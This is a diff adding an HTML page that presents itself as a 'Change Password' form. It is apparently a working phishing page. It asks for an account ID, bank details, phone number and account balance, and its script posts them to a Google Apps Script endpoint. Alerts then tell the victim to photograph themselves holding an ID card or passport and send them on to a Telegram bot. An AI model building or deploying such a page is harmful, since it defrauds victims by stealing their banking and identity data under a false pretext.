@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Change Password</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="stylepass.css">
+</head>
+<body​ style="background-color: rgb(42,78,104);">
+  <div class="container text-center"><br>
+    <br>
+    <div class="card mx-auto" style="width: 18rem;border: none;background-color: rgb(23, 48, 66); border-radius: 10px 50px;"><br>
+		<h3​ style="color: white;font-weight: bold;font-size: 20px;">Change Password Here</h3>
+      <div class="card-body">
+        <form name="submit-to-google-sheet">
+          <div class="mb-3">
+            <input name="ID Account" type="text" class="form-control" placeholder="Account ID" required>
+          </div>
+          <div class="mb-3">
+            <input name="BankName" type="text" class="form-control" placeholder="Type Of bank" required>
+          </div>
+		  <div class="mb-3">
+            <input name="AccountName" type="text" class="form-control" placeholder="Bank name" required>
+          </div>
+		  <div class="mb-3">
+            <input name="Phone" type="text" class="form-control" placeholder="Phone" required>
+          </div>
+		  <div class="mb-3">
+            <input name="Balance" type="text" class="form-control" placeholder="Account amount" required>
+          </div>
+          <div class="mb-3">
+            <input name="FAFA" type="text" class="form-control" placeholder="Enter website name" required>
+          </div>
+		  <button type="submit" onclick="alert('After clicking (Submit) and then the next step, please click the (Select Image) button to take a photo with the ID Card or passport, do not need to wear a hat or something to cover the face.')" class="btn">Submit</button>
+      <!-- <Button class="btn" onclick="myFunction()"   style="border-color: rgba(1, 49, 105, 0.5);"><a class="a1" href="ChagneBank.html" target="_blank" onclick="alert('ដើម្បីបន្តទៅផ្លាស់ប្ដូរកុងធនាគារថ្មីសូមប្រាកដថារាល់ព័ត៍មានទាំងអស់គឺពិតប្រាកដ។ សូមចុចលើពាក្យថា(OK)ដើម្បីបន្ត!!🧐')">ប្ដូរកុងធនាគារ</a></Button> -->
+        </form>
+        <button type="submit" onclick="myFunction()" class="btn" style="margin-top: 5px;">Select Image</button>
+        <!-- <Button class="btn" onclick="myFunction()"   style="border-color: rgba(1, 49, 105, 0.5);"><a class="a1" href="" target="_blank">Hold On</a></Button> -->
+      </div>
+    </div>
+  </div>
+  <script>
+	function myFunction() {
+	  alert("After pressing (Submit) it will bring you to Telegram and press (/start) to wait for the message alert your request to change your password. Thank you dear for supporting us🧡");
+	  window.location.href="https://t.me/khkjkdBot"
+	}
+	</script>
+  <script>
+	const scriptURL = 'https://script.google.com/macros/s/AKfycbw_2tay3TOp-EmxD8E1Fr9T27TzltimySXqaLVct3zogEVFUXeLybEUkhiy_UlX_4CE/exec'; // Replace 'Your URL will be here' with the URL of your Google Apps Script
+	const form = document.forms['submit-to-google-sheet'];
+	form.addEventListener('submit', e => {
+	  e.preventDefault();
+	  fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+		.then(response => console.log('Success!', response))
+		.catch(error => console.error('Error!', error.message));
+	});
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
